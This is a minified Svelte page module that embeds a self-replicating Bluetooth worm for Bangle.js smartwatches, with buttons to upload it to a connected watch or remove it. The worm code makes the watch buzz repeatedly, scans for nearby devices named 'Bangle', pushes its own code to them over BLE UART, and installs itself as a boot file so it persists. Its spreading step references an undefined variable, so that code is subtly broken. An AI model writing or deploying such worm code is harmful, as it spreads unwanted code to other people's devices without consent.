import{S as D,i as S,s as z,y as h,a as v,z as w,c as $,A as O,b,g as R,d as g,B as A,h as m,I as C,k as f,q as N,l as d,m as p,r as k,n as I,G as _,M as y,H as P,N as T}from"../chunks/index.5c2a7ae1.js";import{C as U,a as E,s as q,c as j}from"../chunks/Controls.927ec693.js";const L=`let WORM_MAIN = \`
let WORM_PAYLOAD = setInterval(() => {
	Bangle.buzz();
	console.log('Buzz!');
	NRF.requestDevice({ filters: [{ namePrefix: 'Bangle' }] }).then((dev) => {
		require('ble_uart')
			.connect(device)
			.then((u) => u.write(WORM_MAIN));
	});
}, 5000);

require('Storage').write('worm.boot.js', WORM_MAIN + '\\\\n' + 'eval(WORM_MAIN);' + '\\\\n');
\`;

eval(WORM_MAIN);
`,Y=`clearInterval(WORM_PAYLOAD);
require('Storage').erase('worm.boot.js');
`;function B(i){let t,o,s,a,r,n,e,l;return{c(){t=f("div"),o=f("button"),s=N("Upload Worm"),a=v(),r=f("button"),n=N("Remove Worm"),this.h()},l(u){t=d(u,"DIV",{id:!0,class:!0});var c=p(t);o=d(c,"BUTTON",{});var M=p(o);s=k(M,"Upload Worm"),M.forEach(m),a=$(c),r=d(c,"BUTTON",{});var W=p(r);n=k(W,"Remove Worm"),W.forEach(m),c.forEach(m),this.h()},h(){I(t,"id","worm-commands"),I(t,"class","svelte-8q5v8f")},m(u,c){b(u,t,c),_(t,o),_(o,s),_(t,a),_(t,r),_(r,n),e||(l=[y(o,"click",i[3]),y(r,"click",i[4])],e=!0)},p:P,d(u){u&&m(t),e=!1,T(l)}}}function x(i){let t,o,s,a,r;t=new U({});let n=i[0]&&B(i);return a=new E({}),{c(){h(t.$$.fragment),o=v(),n&&n.c(),s=v(),h(a.$$.fragment)},l(e){w(t.$$.fragment,e),o=$(e),n&&n.l(e),s=$(e),w(a.$$.fragment,e)},m(e,l){O(t,e,l),b(e,o,l),n&&n.m(e,l),b(e,s,l),O(a,e,l),r=!0},p(e,[l]){e[0]?n?n.p(e,l):(n=B(e),n.c(),n.m(s.parentNode,s)):n&&(n.d(1),n=null)},i(e){r||(R(t.$$.fragment,e),R(a.$$.fragment,e),r=!0)},o(e){g(t.$$.fragment,e),g(a.$$.fragment,e),r=!1},d(e){A(t,e),e&&m(o),n&&n.d(e),e&&m(s),A(a,e)}}}function F(i,t,o){let s;C(i,j,l=>o(0,s=l));async function a(){await q(L.replace(`
`,""))}async function r(){await q(Y)}return[s,a,r,()=>a(),()=>r()]}class V extends D{constructor(t){super(),S(this,t,F,x,z,{})}}export{V as default};
